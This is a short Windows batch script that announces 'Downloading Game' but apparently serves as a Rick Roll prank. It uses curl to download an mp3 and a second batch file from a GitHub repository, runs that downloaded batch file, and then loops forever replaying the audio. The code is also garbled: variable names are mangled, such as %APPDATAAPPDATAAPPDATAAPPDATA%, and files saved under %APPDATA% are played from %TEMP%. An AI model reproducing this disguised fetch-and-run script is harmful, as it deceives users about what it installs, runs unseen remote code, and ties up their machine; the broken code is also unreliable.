@echo off

echo Downloading Game

:DOWNLOAD
  mkdir %APPDATA%\yompBest
  curl -o %APPDATAAPPDATAAPPDATAAPPDATA%\yompBest\role.mp3 -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3
  curl -o %APPDATAAPPDATAAPPDATA%\yompBest\m.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat
  %APPDATAAPPDATA%\yompBest\m %TEMP%\yompBest\role.mp3
  goto :play
 
 :play
 %APPDATA%\yompBest\m %TEMP%\yompBest\role.mp3
 
 goto :play
